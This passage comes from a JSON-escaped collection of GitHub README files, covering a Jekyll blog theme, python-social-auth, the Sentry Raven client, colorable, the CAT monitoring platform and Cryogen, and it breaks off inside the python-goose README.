id=\"name\" required data-validation-required-message=\"Please enter your name.\">\n      <p class=\"help-block text-danger\"><\/p>\n    <\/div>\n  <\/div>\n  <div class=\"control-group\">\n    <div class=\"form-group floating-label-form-group controls\">\n      <label>Email Address<\/label>\n      <input type=\"email\" class=\"form-control\" placeholder=\"Email Address\" id=\"email\" required data-validation-required-message=\"Please enter your email address.\">\n      <p class=\"help-block text-danger\"><\/p>\n    <\/div>\n  <\/div>\n  <div class=\"control-group\">\n    <div class=\"form-group col-xs-12 floating-label-form-group controls\">\n      <label>Phone Number<\/label>\n      <input type=\"tel\" class=\"form-control\" placeholder=\"Phone Number\" id=\"phone\" required data-validation-required-message=\"Please enter your phone number.\">\n      <p class=\"help-block text-danger\"><\/p>\n    <\/div>\n  <\/div>\n  <div class=\"control-group\">\n    <div class=\"form-group floating-label-form-group controls\">\n      <label>Message<\/label>\n      <textarea rows=\"5\" class=\"form-control\" placeholder=\"Message\" id=\"message\" required data-validation-required-message=\"Please enter a message.\"><\/textarea>\n      <p class=\"help-block text-danger\"><\/p>\n    <\/div>\n  <\/div>\n  <br>\n  <div id=\"success\"><\/div>\n  <div class=\"form-group\">\n    <button type=\"submit\" class=\"btn btn-primary\" id=\"sendMessageButton\">Send<\/button>\n  <\/div>\n<\/form>\n```\n\nMake sure you have the `email` setting in your `_config.yml` file set to a working email address! Once this is set, fill out the form and then check your email, verify the email address using the link sent to you by Formspree, and then the form will be working!\n\n6. Build your site: `bundle exec jekyll serve`\n\n### Using Core Files\n\nWhen using the core files, the demo images, posts, and pages are all included with the download. After following the instructions below, you can then go and change the content of the pages and posts.\n\n1. [Download](https:\/\/github.com\/BlackrockDigital\/startbootstrap-clean-blog-jekyll\/archive\/master.zip) or Clone the repository.\n2. Update the following configuration settings in your `_config.yml` file:\n   - `baseurl`\n   - `url`\n   - `title`\n   - `email` (after setting this setting to a working email address, fill out the form on the contact page and send it - then check your email and verify the address and the form will send you messages when used)\n   - `description`\n   - `author`\n   - `twitter_username` (Optional)\n   - `facebook_username` (Optional)\n   - `github_username` (Optional)\n   - `linkedin_username` (Optional)\n3. Build your site: `bundle exec jekyll serve`\n\n## Bugs and Issues\n\nHave a bug or an issue with this template? [Open a new issue](https:\/\/github.com\/BlackrockDigital\/startbootstrap-clean-blog-jekyll\/issues) here on GitHub!\n\n## About\n\nStart Bootstrap is an open source library of free Bootstrap templates and themes. All of the free templates and themes on Start Bootstrap are released under the MIT license, which means you can use them for any purpose, even for commercial projects.\n\n* https:\/\/startbootstrap.com\n* https:\/\/twitter.com\/SBootstrap\n\nStart Bootstrap was created by and is maintained by **[David Miller](http:\/\/davidmiller.io\/)**, Owner of [Blackrock Digital](http:\/\/blackrockdigital.io\/).\n\n* http:\/\/davidmiller.io\n* https:\/\/twitter.com\/davidmillerskt\n* https:\/\/github.com\/davidtmiller\n\nStart Bootstrap is based on the [Bootstrap](http:\/\/getbootstrap.com\/) framework created by [Mark Otto](https:\/\/twitter.com\/mdo) and [Jacob Thorton](https:\/\/twitter.com\/fat).\n\n## Copyright and License\n\nCopyright 2013-2019 Blackrock Digital LLC. Code released under the [MIT](https:\/\/github.com\/BlackrockDigital\/startbootstrap-clean-blog-jekyll\/blob\/gh-pages\/LICENSE) license.\n"},{"repo":"\/omab\/python-social-auth","language":"Python","readme_contents":"Python Social Auth\n==================\n\nPython Social Auth is an easy-to-setup social authentication\/registration\nmechanism with support for several frameworks and auth providers.\n\nCrafted using base code from django-social-auth, it implements a common interface\nto define new authentication providers from third parties, and to bring support\nfor more frameworks and ORMs.\n\nDeprecation notice - 2016-12-03\n-------------------------------\n\nAs for Dec 03 2016, this library is now deprecated, the codebase was\nsplit and migrated into the `python-social-auth organization`_,\nwhere a more organized development process is expected to take place.\n\nDetails about moving towards the new setup is documented in the\n`migrating to social`_ document.\n\n.. _python-social-auth organization: https:\/\/github.com\/python-social-auth\n.. _migrating to social: https:\/\/github.com\/omab\/python-social-auth\/blob\/master\/MIGRATING_TO_SOCIAL.md\n"},{"repo":"\/getsentry\/raven-python","language":"Python","readme_contents":".. raw:: html\n\n    <p align=\"center\">\n      <a href=\"https:\/\/sentry.io\" target=\"_blank\" align=\"center\">\n        <img src=\"https:\/\/sentry-brand.storage.googleapis.com\/sentry-logo-black.png\" width=\"280\">\n      <\/a>\n      <br>\n    <\/p>\n\nRaven - Sentry for Python\n=========================\n\n.. image:: https:\/\/img.shields.io\/pypi\/v\/raven.svg\n    :target: https:\/\/pypi.python.org\/pypi\/raven\n    :alt: PyPi page link -- version\n\n.. image:: https:\/\/travis-ci.org\/getsentry\/raven-python.svg?branch=master\n    :target: https:\/\/travis-ci.org\/getsentry\/raven-python\n\n.. image:: https:\/\/img.shields.io\/pypi\/l\/raven.svg\n    :target: https:\/\/pypi.python.org\/pypi\/raven\n    :alt: PyPi page link -- MIT licence\n\n.. image:: https:\/\/img.shields.io\/pypi\/pyversions\/raven.svg\n    :target: https:\/\/pypi.python.org\/pypi\/raven\n    :alt: PyPi page link -- Python versions\n\n.. image:: https:\/\/codeclimate.com\/github\/getsentry\/raven-python\/badges\/gpa.svg\n   :target: https:\/\/codeclimate.com\/github\/getsentry\/raven-python\n   :alt: Code Climate\n\n\nRaven is the official legacy Python client for `Sentry`_, officially supports\nPython 2.6\u20132.7 & 3.3\u20133.7, and runs on PyPy and Google App Engine.\n\n**This SDK is being phased out for** `Sentry-Python <https:\/\/github.com\/getsentry\/sentry-python>`_.\n\nIt tracks errors and exceptions that happen during the\nexecution of your application and provides instant notification with detailed\ninformation needed to prioritize, identify, reproduce and fix each issue.\n\nIt provides full out-of-the-box support for many of the popular python frameworks, including\nDjango, and Flask. Raven also includes drop-in support for any WSGI-compatible\nweb application.\n\nYour application doesn't live on the web? No problem! Raven is easy to use in\nany Python application.\n\nFor more information, see our `Python Documentation`_ for framework integrations and other goodies.\n\n\nFeatures\n--------\n\n- Automatically report (un)handled exceptions and errors\n- Send customized diagnostic data\n- Process and sanitize data before sending it over the network\n\n\nQuickstart\n----------\n\nIt's really easy to get started with Raven. After you complete setting up a project in Sentry,\nyou\u2019ll be given a value which we call a DSN, or Data Source Name. You will need it to configure the client.\n\n\nInstall the latest package with *pip* and configure the client::\n\n    pip install raven --upgrade\n\nCreate a client and capture an example exception:\n\n.. sourcecode:: python\n\n    from raven import Client\n\n    client = Client('___DSN___')\n\n    try:\n        1 \/ 0\n    except ZeroDivisionError:\n        client.captureException()\n\n\nRaven Python is more than that however. Checkout our `Python Documentation`_.\n\n\nContributing\n------------\n\nRaven will continue to be maintained for bugfixes and contributions are more than welcome!  New features should only go into the new sentry-python SDK.\n\nThere are many ways to contribute:\n\n* Join in on discussions on our `Mailing List`_ or in our `IRC Channel`_.\n\n* Report bugs on our `Issue Tracker`_.\n\n* Submit a pull request!\n\n\nResources\n---------\n\n* `Sentry`_\n* `Python Documentation`_\n* `Issue Tracker`_\n* `Code`_ on Github\n* `Mailing List`_\n* `IRC Channel`_ (irc.freenode.net, #sentry)\n* `Travis CI`_\n\n.. _Sentry: https:\/\/getsentry.com\/\n.. _Python Documentation: https:\/\/docs.getsentry.com\/hosted\/clients\/python\/\n.. _SDKs for other platforms: https:\/\/docs.sentry.io\/#platforms\n.. _Issue Tracker: https:\/\/github.com\/getsentry\/raven-python\/issues\n.. _Code: https:\/\/github.com\/getsentry\/raven-python\n.. _Mailing List: https:\/\/groups.google.com\/group\/getsentry\n.. _IRC Channel: irc:\/\/irc.freenode.net\/sentry\n.. _Travis CI: http:\/\/travis-ci.org\/getsentry\/raven-python\n\n\n\n\n\nNot using Python? Check out our `SDKs for other platforms`_.\n"},{"repo":"\/jxnblk\/colorable","language":"HTML","readme_contents":"# Colorable\n\nTake a set color palette and get contrast values for every possible combination \u2013 \nuseful for finding safe color combinations with predefined colors\nand includes pass\/fail scores for the\n[WCAG accessibility guidelines](http:\/\/www.w3.org\/TR\/WCAG20\/#visual-audio-contrast).\n\n## Getting Started\n\n```bash\nnpm i --save colorable\n```\n\n## Usage\n\nPass an array of color strings or an object with color strings as values. \n\n```js\nvar colorable = require('colorable')\n\nvar colors = {\n  red: 'red',\n  green: 'green',\n  blue: 'blue'\n}\n\nvar result = colorable(colors, { compact: true, threshold: 0 })\n```\n\nReturns an array of colors with combinations for all other colors and their\n[WCAG contrast](http:\/\/www.w3.org\/TR\/WCAG20\/#visual-audio-contrast)\nvalues.\n\n```json\n[\n  {\n    \"hex\": \"#FF0000\",\n    \"name\": \"red\",\n    \"combinations\": [\n      {\n        \"hex\": \"#008000\",\n        \"name\": \"green\",\n        \"contrast\": 1.28483997166146,\n        \"accessibility\": {\n          \"aa\": false,\n          \"aaLarge\": false,\n          \"aaa\": false,\n          \"aaaLarge\": false\n        }\n      },\n      {\n        \"hex\": \"#0000FF\",\n        \"name\": \"blue\",\n        \"contrast\": 2.148936170212766,\n        \"accessibility\": {\n          \"aa\": false,\n          \"aaLarge\": false,\n          \"aaa\": false,\n          \"aaaLarge\": false\n        }\n      }\n    ]\n  },\n  ...\n]\n```\n\n### Accessibility object\n\nEach key is a boolean value indicating if the color contrast meets the following criteria:\n- `aa` - greater than 4.5 (for normal sized text)\n- `aaLarge` - greater than 3 ([for bold text or text larger than 24px](http:\/\/www.w3.org\/TR\/WCAG20\/#larger-scaledef))\n- `aaa` - greater than 7 \n- `aaaLarge` - greater than 4.5 \n\n---\n\n## Options\n\n### `compact`\n\n_Type: Boolean (default: `false`)_\n\nIf set to `true`, the result will be a smaller object that only includes hex value color strings, a name for each color (if an object is passed to the function), contrast, and accessibility values.\nWhen set to `false`, the result also includes the entire [harthur\/color](https:\/\/www.npmjs.com\/package\/color) object for each color, which includes other properties and methods for color manipulation.\n\n### `threshold`\n\n_Type: Number (default: `0`)_\n\nWhen set, the colorable function only returns combinations that have a contrast above this value. This is useful for only seeing combinations that pass a minimum contrast level.\n\n### `uniq`\n\n_Type: Boolean (default: true)_\n\nWhen set to `true`, the array of colors is passed through lodash.uniq to remove duplicates.\n\n\n---\n\nMIT License\n\n"},{"repo":"\/dianping\/cat","language":"Java","readme_contents":"<img src=\"https:\/\/github.com\/dianping\/cat\/raw\/master\/cat-home\/src\/main\/webapp\/images\/logo\/cat_logo03.png\" width=\"50%\">\n\n**CAT**\n [![GitHub stars](https:\/\/img.shields.io\/github\/stars\/dianping\/cat.svg?style=social&label=Star&)](https:\/\/github.com\/dianping\/cat\/stargazers)\n [![GitHub forks](https:\/\/img.shields.io\/github\/forks\/dianping\/cat.svg?style=social&label=Fork&)](https:\/\/github.com\/dianping\/cat\/fork)\n\n### CAT \u7b80\u4ecb \n\n- CAT \u662f\u57fa\u4e8e Java \u5f00\u53d1\u7684\u5b9e\u65f6\u5e94\u7528\u76d1\u63a7\u5e73\u53f0\uff0c\u4e3a\u7f8e\u56e2\u70b9\u8bc4\u63d0\u4f9b\u4e86\u5168\u9762\u7684\u5b9e\u65f6\u76d1\u63a7\u544a\u8b66\u670d\u52a1\u3002\n- CAT \u4f5c\u4e3a\u670d\u52a1\u7aef\u9879\u76ee\u57fa\u7840\u7ec4\u4ef6\uff0c\u63d0\u4f9b\u4e86 Java, C\/C++, Node.js, Python, Go \u7b49\u591a\u8bed\u8a00\u5ba2\u6237\u7aef\uff0c\u5df2\u7ecf\u5728\u7f8e\u56e2\u70b9\u8bc4\u7684\u57fa\u7840\u67b6\u6784\u4e2d\u95f4\u4ef6\u6846\u67b6\uff08MVC\u6846\u67b6\uff0cRPC\u6846\u67b6\uff0c\u6570\u636e\u5e93\u6846\u67b6\uff0c\u7f13\u5b58\u6846\u67b6\u7b49\uff0c\u6d88\u606f\u961f\u5217\uff0c\u914d\u7f6e\u7cfb\u7edf\u7b49\uff09\u6df1\u5ea6\u96c6\u6210\uff0c\u4e3a\u7f8e\u56e2\u70b9\u8bc4\u5404\u4e1a\u52a1\u7ebf\u63d0\u4f9b\u7cfb\u7edf\u4e30\u5bcc\u7684\u6027\u80fd\u6307\u6807\u3001\u5065\u5eb7\u72b6\u51b5\u3001\u5b9e\u65f6\u544a\u8b66\u7b49\u3002\n- CAT \u5f88\u5927\u7684\u4f18\u52bf\u662f\u5b83\u662f\u4e00\u4e2a\u5b9e\u65f6\u7cfb\u7edf\uff0cCAT \u5927\u90e8\u5206\u7cfb\u7edf\u662f\u5206\u949f\u7ea7\u7edf\u8ba1\uff0c\u4f46\u662f\u4ece\u6570\u636e\u751f\u6210\u5230\u670d\u52a1\u7aef\u5904\u7406\u7ed3\u675f\u662f\u79d2\u7ea7\u522b\uff0c\u79d2\u7ea7\u5b9a\u4e49\u662f48\u5206\u949f40\u79d2\uff0c\u57fa\u672c\u4e0a\u770b\u523048\u5206\u949f38\u79d2\u6570\u636e\uff0c\u6574\u4f53\u62a5\u8868\u7684\u7edf\u8ba1\u7c92\u5ea6\u662f\u5206\u949f\u7ea7\uff1b\u7b2c\u4e8c\u4e2a\u4f18\u52bf\uff0c\u76d1\u63a7\u6570\u636e\u662f\u5168\u91cf\u7edf\u8ba1\uff0c\u5ba2\u6237\u7aef\u9884\u8ba1\u7b97\uff1b\u94fe\u8def\u6570\u636e\u662f\u91c7\u6837\u8ba1\u7b97\u3002\n\n### Cat \u4ea7\u54c1\u4ef7\u503c\n\n- \u51cf\u5c11\u6545\u969c\u53d1\u73b0\u65f6\u95f4\n- \u964d\u4f4e\u6545\u969c\u5b9a\u4f4d\u6210\u672c\n- \u8f85\u52a9\u5e94\u7528\u7a0b\u5e8f\u4f18\u5316\n\n### Cat \u4f18\u52bf\n\n- \u5b9e\u65f6\u5904\u7406\uff1a\u4fe1\u606f\u7684\u4ef7\u503c\u4f1a\u968f\u65f6\u95f4\u9510\u51cf\uff0c\u5c24\u5176\u662f\u4e8b\u6545\u5904\u7406\u8fc7\u7a0b\u4e2d\n- \u5168\u91cf\u6570\u636e\uff1a\u5168\u91cf\u91c7\u96c6\u6307\u6807\u6570\u636e\uff0c\u4fbf\u4e8e\u6df1\u5ea6\u5206\u6790\u6545\u969c\u6848\u4f8b\n- \u9ad8\u53ef\u7528\uff1a\u6545\u969c\u7684\u8fd8\u539f\u4e0e\u95ee\u9898\u5b9a\u4f4d\uff0c\u9700\u8981\u9ad8\u53ef\u7528\u76d1\u63a7\u6765\u652f\u6491\n- \u6545\u969c\u5bb9\u5fcd\uff1a\u6545\u969c\u4e0d\u5f71\u54cd\u4e1a\u52a1\u6b63\u5e38\u8fd0\u8f6c\u3001\u5bf9\u4e1a\u52a1\u900f\u660e\n- \u9ad8\u541e\u5410\uff1a\u6d77\u91cf\u76d1\u63a7\u6570\u636e\u7684\u6536\u96c6\uff0c\u9700\u8981\u9ad8\u541e\u5410\u80fd\u529b\u505a\u4fdd\u8bc1\n- \u53ef\u6269\u5c55\uff1a\u652f\u6301\u5206\u5e03\u5f0f\u3001\u8de8 IDC \u90e8\u7f72\uff0c\u6a2a\u5411\u6269\u5c55\u7684\u76d1\u63a7\u7cfb\u7edf\n\n### \u66f4\u65b0\u65e5\u5fd7\n\n- [**\u6700\u65b0\u7248\u672c\u7279\u6027\u4e00\u89c8**](https:\/\/github.com\/dianping\/cat\/wiki\/new)\n\n    - \u6ce8\u610fcat\u76843.0\u4ee3\u7801\u5206\u652f\u66f4\u65b0\u90fd\u53d1\u5e03\u5728master\u4e0a\uff0c\u5305\u62ec\u6700\u65b0\u6587\u6863\u4e5f\u90fd\u662f\u8fd9\u4e2a\u5206\u652f\n    - \u6ce8\u610f\u6587\u6863\u8bf7\u7528\u6700\u65b0master\u91cc\u9762\u7684\u4ee3\u7801\u6587\u6863\u4f5c\u4e3a\u6807\u51c6\uff0c\u4e00\u4e9b\u5f00\u6e90\u7f51\u7ad9\u4e0a\u9762\u4e00\u4e9b\u8001\u7248\u672c\u7684\u4e00\u4e9b\u914d\u7f6e\u5305\u62ec\u6570\u636e\u5e93\u7b49\u53ef\u80fd\u9047\u5230\u4e0d\u517c\u5bb9\u60c5\u51b5\uff0c\u8bf7\u4ee5master\u4ee3\u7801\u4e3a\u51c6\uff0c\u8fd9\u4efd\u6587\u6863\u90fd\u662f\u7f8e\u56e2\u70b9\u8bc4\u5185\u90e8\u540c\u5b66\u4e3a\u8fd9\u4e2a\u7248\u672c\u7edf\u4e00\u6574\u7406\u6c47\u603b\u3002\u5185\u90e8\u540c\u5b66\u5df2\u7ecf\u6838\u5bf9\uff0c\u5305\u62ec\u4e5f\u9a8c\u8bc1\u8fc7\uff0c\u5982\u679c\u9047\u5230\u4e00\u4e9b\u770b\u4e0d\u61c2\uff0c\u6216\u8005\u6a21\u7cca\u7684\u5730\u65b9\uff0c\u6b22\u8fce\u63d0\u4ea4PR\u3002\n    - \u591a\u8bed\u8a00\u5ba2\u6237\u7aef\uff1aJava\u3001C\/C++\u3001Node.js\u3001Python\u3001Go [\u4f20\u9001\u95e8](https:\/\/github.com\/dianping\/cat\/tree\/master\/lib)\n        \n        * [**Java**](https:\/\/github.com\/dianping\/cat\/blob\/master\/lib\/java)\n        * [**C**](https:\/\/github.com\/dianping\/cat\/blob\/master\/lib\/c)\n        * [**C++**](https:\/\/github.com\/dianping\/cat\/blob\/master\/lib\/cpp)\n        * [**Python**](https:\/\/github.com\/dianping\/cat\/blob\/master\/lib\/python)\n        * [**Go**](https:\/\/github.com\/dianping\/cat\/blob\/master\/lib\/go)\n        * [**Node.js**](https:\/\/github.com\/dianping\/cat\/blob\/master\/lib\/node.js)\n        \n    - \u6d88\u606f\u91c7\u6837\u805a\u5408\n    - \u5e8f\u5217\u5316\u534f\u8bae\u5347\u7ea7\n    - \u5168\u65b0\u6587\u4ef6\u5b58\u50a8\u5f15\u64ce\n   \n\n### \u76d1\u63a7\u6a21\u578b\uff1a\n\n\u652f\u6301 Transaction\u3001Event\u3001Heartbeat\u3001Metric \u56db\u79cd\u6d88\u606f\u6a21\u578b\u3002 [**\u6a21\u578b\u8bbe\u8ba1**](https:\/\/github.com\/dianping\/cat\/wiki\/model)\n\n### \u6a21\u5757\u7b80\u4ecb\n\n#### \u529f\u80fd\u6a21\u5757\n\n- cat-client: \u5ba2\u6237\u7aef\uff0c\u4e0a\u62a5\u76d1\u63a7\u6570\u636e\n- cat-consumer: \u670d\u52a1\u7aef\uff0c\u6536\u96c6\u76d1\u63a7\u6570\u636e\u8fdb\u884c\u7edf\u8ba1\u5206\u6790\uff0c\u6784\u5efa\u4e30\u5bcc\u7684\u7edf\u8ba1\u62a5\u8868\n- cat-alarm: \u5b9e\u65f6\u544a\u8b66\uff0c\u63d0\u4f9b\u62a5\u8868\u6307\u6807\u7684\u76d1\u63a7\u544a\u8b66\n- cat-hadoop: \u6570\u636e\u5b58\u50a8\uff0clogview \u5b58\u50a8\u81f3 Hdfs\n- cat-home: \u7ba1\u7406\u7aef\uff0c\u62a5\u8868\u5c55\u793a\u3001\u914d\u7f6e\u7ba1\u7406\u7b49\n\n> 1. \u6839\u76ee\u5f55\u4e0b cat-client \u6a21\u5757\u4ee5\u540e\u4e0d\u518d\u7ef4\u62a4\uff0c\u4e0b\u4e2a\u5927\u7248\u672c\u66f4\u65b0\u8ba1\u5212\u79fb\u9664\u3002\u65b0\u7248Java\u5ba2\u6237\u7aef\u53c2\u8003\uff1alib\/java\n> 2. \u7ba1\u7406\u7aef\u3001\u670d\u52a1\u7aef\u3001\u544a\u8b66\u670d\u52a1\u5747\u4f7f\u7528 cat-home \u6a21\u5757\u90e8\u7f72\u5373\u53ef\n\n#### \u5176\u4ed6\u6a21\u5757\n\n- integration\uff1acat\u548c\u4e00\u4e9b\u7b2c\u4e09\u65b9\u5de5\u5177\u96c6\u6210\u7684\u5185\u5bb9\uff08\u6b64\u90e8\u5206\u4e00\u90e8\u5206\u662f\u7531\u793e\u533a\u8d21\u732e\uff0c\u4e00\u90e8\u5206\u5b98\u65b9\u8d21\u732e\uff09\n- lib\uff1aCAT \u7684\u5ba2\u6237\u7aef\uff0c\u5305\u62ec Java\u3001C\/C++\u3001Python\u3001Node.js\u3001Go\n- script\uff1aCAT \u6570\u636e\u5e93\u811a\u672c\n\n### Quick Start\n\n- [\u90e8\u7f72FAQ](https:\/\/github.com\/dianping\/cat\/wiki\/cat_faq)\n\n#### \u670d\u52a1\u7aef\n\n- [\u96c6\u7fa4\u90e8\u7f72](https:\/\/github.com\/dianping\/cat\/wiki\/readme_server)\n- [\u62a5\u8868\u4ecb\u7ecd](https:\/\/github.com\/dianping\/cat\/wiki\/readme_report)\n- [\u914d\u7f6e\u624b\u518c](https:\/\/github.com\/dianping\/cat\/wiki\/readme_config)\n\n### \u9879\u76ee\u8bbe\u8ba1\n\n- [\u9879\u76ee\u67b6\u6784](https:\/\/github.com\/dianping\/cat\/wiki\/overall)\n- [\u5ba2\u6237\u7aef\u8bbe\u8ba1](https:\/\/github.com\/dianping\/cat\/wiki\/client)\n- [\u670d\u52a1\u7aef\u8bbe\u8ba1](https:\/\/github.com\/dianping\/cat\/wiki\/server)\n- [\u6a21\u578b\u8bbe\u8ba1](https:\/\/github.com\/dianping\/cat\/wiki\/model)\n\n### Copyright and License\n\n[Apache 2.0 License.](\/LICENSE)\n\n### CAT \u63a5\u5165\u516c\u53f8\n\n![Alt text](cat-home\/src\/main\/webapp\/images\/logo\/companys.png)\n\n\u66f4\u591a\u63a5\u5165\u516c\u53f8\uff0c\u6b22\u8fce\u5728 <https:\/\/github.com\/dianping\/cat\/issues\/753> \u767b\u8bb0\n\n### \u8054\u7cfb\u6211\u4eec\n\n\u6211\u4eec\u9700\u8981\u77e5\u9053\u4f60\u5bf9Cat\u7684\u4e00\u4e9b\u770b\u6cd5\u4ee5\u53ca\u5efa\u8bae\uff1a\n\n- Mail: cat@dianping.com\uff0c\n- [**Issues**](https:\/\/github.com\/dianping\/cat\/issues)\n"},{"repo":"\/cryogen-project\/cryogen","language":"HTML","readme_contents":"<img src=\"https:\/\/raw.githubusercontent.com\/lacarmen\/cryogen\/master\/cryogen.png\"\n hspace=\"20\" align=\"left\" height=\"200\"\/>\n\n<!-- Non-breaking space -->\n&nbsp;\n\nThis ReadMe only documents a subset of Cryogen's features. For additional documentation please see the [cryogen site](http:\/\/cryogenweb.org).\n\n<!-- Non-breaking space -->\n&nbsp;\n\n\n## Features\n\n* Blog posts and pages with Markdown (default) or AsciiDoc\n* Tags\n* Table of contents generation\n* Plain HTML page templates\n* Code syntax highlighting\n* Disqus support\n* Sitemap generation\n* RSS feed generation\n* Sass\/SCSS compilation\n* Klipse Integration\n\n## Prerequisites\n\nYou will need [Leiningen][1] 2.5.0 or above installed.\n\n[1]: https:\/\/github.com\/technomancy\/leiningen\n\n## Usage\n\n### Creating a New Site\n\nA new site can be created using the Cryogen template as follows:\n\n```\nlein new cryogen my-blog\n```\n\n### Running the Server\n\nThe web server can be started from the `my-blog` directory using the `lein-ring` plugin:\n\n```\nlein ring server\n```\n\nThe server will watch for changes in the `content` and `themes` folders and recompile the content automatically.\n\nYou can also generate the content without bringing up a server via:\n\n```\nlein run\n```\n\n### Site Configuration\n\nThe site configuration file is found at `content\/config.edn`, this file looks as follows:\n\n```clojure\n{:site-title                   \"My Awesome Blog\"\n :author                       \"Bob Bobbert\"\n :description                  \"This blog is awesome\"\n :site-url                     \"http:\/\/blogawesome.com\/\"\n :post-root                    \"posts\"\n :page-root                    \"pages\"\n :post-root-uri                \"posts-output\"\n :page-root-uri                \"pages-output\"\n :tag-root-uri                 \"tags-output\"\n :author-root-uri              \"authors-output\"\n :public-dest                  \"public\"\n :blog-prefix                  \"\/blog\"\n :rss-name                     \"feed.xml\"\n :rss-filters                  [\"cryogen\"]\n :recent-posts                 3\n :post-date-format             \"yyyy-MM-dd\"\n :archive-group-format         \"yyyy MMMM\"\n :sass-src                     []\n :sass-path                    \"sass\"\n :theme                        \"blue\"\n :resources                    [\"img\"]\n :keep-files                   [\".git\"]\n :disqus?                      false\n :disqus-shortname             \"\"\n :ignored-files                [#\"\\.#.*\" #\".*\\.swp$\"]\n :previews?                    false\n :posts-per-page               5\n :blocks-per-preview           2\n :clean-urls                   :trailing-slash\n :collapse-subdirs?            false\n :hide-future-posts?           true\n :klipse                       {}\n :description-include-elements #{:p :h1 :h2 :h3 :h4 :h5 :h6}\n :debug?                       false}\n```\n\nFor information about each key please see the [\"Configuration\"](http:\/\/cryogenweb.org\/docs\/configuration.html) portion of the Cryogen documentation site.\n\n### Switching between Markdown and AsciiDoc\n\nCryogen comes with Markdown support as default. If you want to use AsciiDoc instead, open the `project.clj` in your created blog (e.g. `my-blog`), and change the line in `:dependencies` that says `cryogen-markdown` to `cryogen-asciidoc`.\nInstead of looking for files ending in `.md` in the `content\/md` directory, the compiler will now look for files ending in `.asc` in the `content\/asc` directory.\n\n### Selecting a Theme\n\nThe Cryogen template comes with three themes in the `themes` folder. To change your blog's theme, change the value of the `:theme` key in `config.edn`. Note that the Nucleus theme is obtained from [downloadwebsitetemplates.co.uk](http:\/\/www.downloadwebsitetemplates.co.uk\/template\/nucleus\/) that requires you to keep the footer, unless you make a donation on their website.\n\n### Customizing Layouts\n\nCryogen uses [Selmer](https:\/\/github.com\/yogthos\/Selmer) templating engine for layouts. Please refer to its documentation to see the supported tags and filters for the layouts.\n\nThe layouts are contained in the `themes\/{theme}\/html` folder of the project. By default, the `base.html` layout is used to provide the general layout for the site. This is where you would add static resources such as CSS and JavaScript assets as well as define headers and footers for your site.\n\nEach page layout should have a name that matches the `:layout` key in the page metadata and end with `.html`. Page layouts extend the base layout and should only contain the content relaveant to the page inside the `content` block.\nFor example, the `tag` layout is located in `tag.html` and looks as follows:\n\n```xml\n{% extends \"\/html\/base.html\" %}\n{% block content %}\n<div id=\"posts-by-tag\">\n    <h2>Posts tagged {{name}}<\/h2>\n    <ul>\n    {% for post in posts %}\n        <li>\n            <a href=\"{{post.uri}}\">{{post.title}}<\/a>\n        <\/li>\n    {% endfor %}\n    <\/ul>\n<\/div>\n{% endblock %}\n```\n\n### Code Syntax Highlighting\n\nCryogen uses [Highlight.js](https:\/\/highlightjs.org\/) for code syntax highlighting. You can add more languages by replacing `themes\/{theme}\/js\/highlight.pack.js` with a customized package from [here](https:\/\/highlightjs.org\/download\/).\n\nThe ` initHighlightingOnLoad` function is called in `themes\/{theme}\/html\/base.html`.\n\n```xml\n<script>hljs.initHighlightingOnLoad();<\/script>\n```\n\n## Deploying Your Site\n\nThe generated static content will be found under the `public` folder. Simply copy the content to a static\nfolder for a server such as Nginx or Apache and your site is now ready for service.\n\nA sample Nginx configuration that's placed in `\/etc\/nginx\/sites-available\/default` can be seen below:\n\n```javascript\nserver {\n  listen 80 default_server;\n  listen [::]:80 default_server ipv6only=on;\n  server_name localhost <yoursite.com> <www.yoursite.com>;\n\n  access_log  \/var\/log\/blog_access.log;\n  error_log   \/var\/log\/blog_error.log;\n\n  location \/ {\n    alias       \/var\/blog\/;\n    error_page  404 = \/404.html;\n  }\n}\n```\n\nSimply set `yoursite.com` to the domain of your site in the above configuration and\nensure the static content is available at `\/var\/blog\/`. Finally, place your custom error page\nin the `\/var\/blog\/404.html` file.\n\nMore information on deployment can be found [here](http:\/\/cryogenweb.org\/docs\/deploying-to-github-pages.html).\n\n## Third Party Libraries\n\n#### https:\/\/github.com\/greywolve\/cryogen-markdown-external\n\nA Clojure library to provide Markdown rendering to the cryogen-core compiler by using an external command\/program, such as pandoc.\n\n\n\n## Some Sites Made With Cryogen\n\n* [My personal blog](http:\/\/carmen.la\/blog\/archives)\n* [Cryogen Documentation Site](http:\/\/cryogenweb.org)\n* [Yogthos' blog](http:\/\/yogthos.net\/)\n* [Chad Stovern's blog](http:\/\/www.chadstovern.com)\n* [szcz](http:\/\/www.szcz.org\/)\n* [ISvit blog](https:\/\/blog.isvit.info)\n* [Lambda Funk](http:\/\/lambdafunk.com)\n* [DDFT.wiki](https:\/\/ddft.wiki)\n* [Ampersanda's blog](https:\/\/ampersanda.dev)\n* [irrelevancy universe](https:\/\/irrelevancy.neocities.org)\n\n## License\n\nCopyright \u00a9 2014-2017 Carmen La\n\nDistributed under the Eclipse Public License, the same as Clojure.\n"},{"repo":"\/grangier\/python-goose","language":"HTML","readme_contents":"Python-Goose - Article Extractor |Build Status|\n===============================================\n\nIntro\n-----\n\nGoose was originally an article extractor written in Java that has most\nrecently (Aug2011) been converted to a `scala project <https:\/\/github.com\/GravityLabs\/goose>`_.\n\nThis is a complete rewrite in Python. The aim of the software is to\ntake any news article or article-type web page and not only extract what\nis the main body of the article but also all meta data and most probable\nimage candidate.\n\nGoose will try to extract the following information:\n\n-  Main text of an article\n-  Main image of article\n-  Any YouTube\/Vimeo movies embedded in article\n-  Meta Description\n-  Meta tags\n\nThe Python version was rewritten by:\n\n-  Xavier Grangier\n\nLicensing\n---------\n\nIf you find Goose useful or have issues please drop me a line. I'd love\nto hear how you're using it or what features should be improved.\n\nGoose is licensed by Gravity.com under the Apache 2.0 license; see the\nLICENSE file for more details.\n\nSetup\n-----\n\n::\n\n    mkvirtualenv --no-site-packages goose\n    git clone https:\/\/github.com\/grangier\/python-goose.git\n    cd python-goose\n    pip install -r requirements.txt\n    python setup.py install\n\nTake it for a spin\n------------------\n\n::\n\n    >>> from goose import Goose\n    >>> url = 'http:\/\/edition.cnn.com\/2012\/02\/22\/world\/europe\/uk-occupy-london\/index.html?hpt=ieu_c2'\n    >>> g = Goose()\n    >>> article = g.extract(url=url)\n    >>> article.title\n    u'Occupy London loses eviction fight'\n    >>> article.meta_description\n    \"Occupy London protesters who have been camped outside the landmark St. Paul's Cathedral for the past four months lost their court bid to avoid eviction Wednesday in a decision made by London's Court of Appeal.\"\n    >>> article.cleaned_text[:150]\n    (CNN) -- Occupy London protesters who have been camped outside the landmark St. Paul's Cathedral for the past four months lost their court bid to avoi\n    >>> article.top_image.src\n    